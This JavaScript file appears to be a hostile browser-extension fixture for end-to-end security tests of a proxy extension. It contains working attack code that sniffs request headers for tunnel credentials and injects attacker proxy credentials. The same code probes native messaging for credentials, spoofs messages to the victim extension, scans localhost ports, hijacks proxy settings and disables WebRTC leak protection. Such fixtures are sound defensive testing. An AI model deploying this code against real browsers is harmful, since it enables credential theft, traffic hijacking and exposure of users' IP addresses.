// PP-ADVERSARIAL-FIXTURE — hostile extension used only by the E2E security tests. Never ship.
// Every function is called from the test with evaluate() and returns what it managed to get.

// Header sniffing: record every request header this extension can observe (with extraHeaders,
// the most Chromium exposes to extensions), to check whether the tunnel credentials leak.
const seenHeaders = [];
const seenAuth = [];
chrome.webRequest.onSendHeaders.addListener(
  (d) => {
    for (const h of d.requestHeaders || []) seenHeaders.push(`${h.name}: ${h.value}`);
    if (seenHeaders.length > 5000) seenHeaders.splice(0, 1000);
  },
  { urls: ['<all_urls>'] },
  ['requestHeaders', 'extraHeaders'],
);
// Observe proxy challenges; answer nothing (to see what the details reveal) unless jamming.
let jam = false;
chrome.webRequest.onAuthRequired.addListener(
  (d, cb) => {
    seenAuth.push({ isProxy: d.isProxy, challenger: d.challenger, url: d.url });
    if (jam && d.isProxy) cb({ authCredentials: { username: 'attacker', password: 'attacker' } });
    else cb({});
  },
  { urls: ['<all_urls>'] },
  ['asyncBlocking'],
);

globalThis.sniffed = () => ({ headers: seenHeaders.slice(), auth: seenAuth.slice() });
globalThis.setJam = (v) => {
  jam = v;
};

globalThis.attack = async (victim) => {
  const out = {};
  // 1. Native messaging to the victim's host (port and one-shot).
  await new Promise((resolve) => {
    try {
      const p = chrome.runtime.connectNative('com.privateproxy.host');
      p.onMessage.addListener(() => {
        out.native = 'GOT A MESSAGE FROM THE HOST';
      });
      p.onDisconnect.addListener(() => {
        out.native = out.native || 'disconnected: ' + (chrome.runtime.lastError?.message || '');
        resolve();
      });
      p.postMessage({ id: 1, cmd: 'getIdeCredentials', args: {} });
    } catch (e) {
      out.native = 'threw: ' + e.message;
      resolve();
    }
    setTimeout(resolve, 5000);
  });
  await new Promise((resolve) => {
    try {
      chrome.runtime.sendNativeMessage('com.privateproxy.host', { id: 2, cmd: 'hello', args: { protocolVersion: 3 } }, (r) => {
        out.nativeOneShot = r ? 'GOT ' + JSON.stringify(r) : 'error: ' + (chrome.runtime.lastError?.message || '');
        resolve();
      });
    } catch (e) {
      out.nativeOneShot = 'threw: ' + e.message;
      resolve();
    }
    setTimeout(resolve, 5000);
  });
  // 2. External messaging / spoofing the popup.
  for (const msg of [
    { type: 'request', cmd: 'disconnect', args: {} },
    { type: 'getState' },
    { type: 'request', cmd: 'getIdeCredentials', args: {} },
  ]) {
    const k = 'message_' + (msg.cmd || msg.type);
    try {
      out[k] = String(JSON.stringify(await chrome.runtime.sendMessage(victim, msg)));
    } catch (e) {
      out[k] = 'error: ' + e.message;
    }
  }
  await new Promise((resolve) => {
    try {
      const port = chrome.runtime.connect(victim, { name: 'popup' });
      port.onMessage.addListener(() => {
        out.port = 'GOT STATE FROM VICTIM';
        resolve();
      });
      port.onDisconnect.addListener(() => {
        out.port = out.port || 'disconnected: ' + (chrome.runtime.lastError?.message || '');
        resolve();
      });
      port.postMessage({ type: 'request', cmd: 'disconnect', args: {} });
    } catch (e) {
      out.port = 'threw: ' + e.message;
      resolve();
    }
    setTimeout(resolve, 3000);
  });
  // 3. Victim resources.
  try {
    out.resource = 'READ ' + (await (await fetch(`chrome-extension://${victim}/manifest.json`)).text()).slice(0, 40);
  } catch (e) {
    out.resource = 'blocked: ' + e.message;
  }
  // 4. What the shared browser settings reveal.
  out.proxySettings = JSON.stringify(await chrome.proxy.settings.get({}));
  return out;
};

// Localhost scan with host permissions (extensions bypass CORS and can read the responses).
globalThis.scan = async (ports) => {
  const res = {};
  await Promise.all(
    ports.map(async (p) => {
      const ctl = new AbortController();
      const t = setTimeout(() => ctl.abort(), 3000);
      try {
        const r = await fetch(`http://127.0.0.1:${p}/`, { signal: ctl.signal, cache: 'no-store' });
        res[p] = `${r.status} ${(await r.text()).slice(0, 60)}`;
      } catch (e) {
        res[p] = 'error: ' + e.message;
      }
      clearTimeout(t);
    }),
  );
  return res;
};

// Fetch a URL through whatever proxy the browser uses (i.e. ride the victim's tunnel).
globalThis.fetchText = async (url) => {
  try {
    const r = await fetch(url, { cache: 'no-store' });
    return `${r.status} ${(await r.text()).slice(0, 80)}`;
  } catch (e) {
    return 'error: ' + e.message;
  }
};

// Proxy takeover (optionally towards a trap proxy that challenges for credentials).
globalThis.takeOver = async (port = 9) => {
  await chrome.proxy.settings.set({ value: { mode: 'fixed_servers', rules: { singleProxy: { scheme: 'http', host: '127.0.0.1', port } } }, scope: 'regular' });
  return (await chrome.proxy.settings.get({})).levelOfControl;
};
globalThis.release = async () => chrome.proxy.settings.clear({ scope: 'regular' });
// Rapid flip-flopping of the proxy setting, for race tests.
globalThis.flap = async (port, times) => {
  for (let i = 0; i < times; i++) {
    await globalThis.takeOver(port);
    await new Promise((r) => setTimeout(r, 20));
    await globalThis.release();
    await new Promise((r) => setTimeout(r, 20));
  }
  return (await chrome.proxy.settings.get({})).levelOfControl;
};
// Try to undo the victim's WebRTC protection.
globalThis.webrtcOff = async () => {
  try {
    await chrome.privacy.network.webRTCIPHandlingPolicy.set({ value: 'default' });
  } catch (e) {
    return 'error: ' + e.message;
  }
  return JSON.stringify(await chrome.privacy.network.webRTCIPHandlingPolicy.get({}));
};
globalThis.webrtcRelease = async () => chrome.privacy.network.webRTCIPHandlingPolicy.clear({});
